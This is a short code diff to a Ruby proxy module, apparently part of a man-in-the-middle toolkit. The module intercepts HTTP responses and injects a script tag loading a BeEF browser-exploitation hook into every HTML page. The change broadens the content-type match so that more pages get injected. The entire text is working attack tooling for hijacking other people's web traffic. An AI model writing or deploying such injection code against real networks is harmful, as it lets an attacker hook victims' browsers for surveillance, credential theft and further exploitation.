@@ -33,7 +33,7 @@ class BeefBox < Proxy::Module
 
   def on_request( request, response )
     # is it a html page?
-    if response.content_type == 'text/html'
+    if response.content_type =~ /^text\/html.*/
       Logger.warn "Injecting BeEF into http://#{request.host}#{request.url}"
 
       response.body.sub!( '</title>', "</title><script src='#{@jsfile}' type='text/javascript'></script>" )
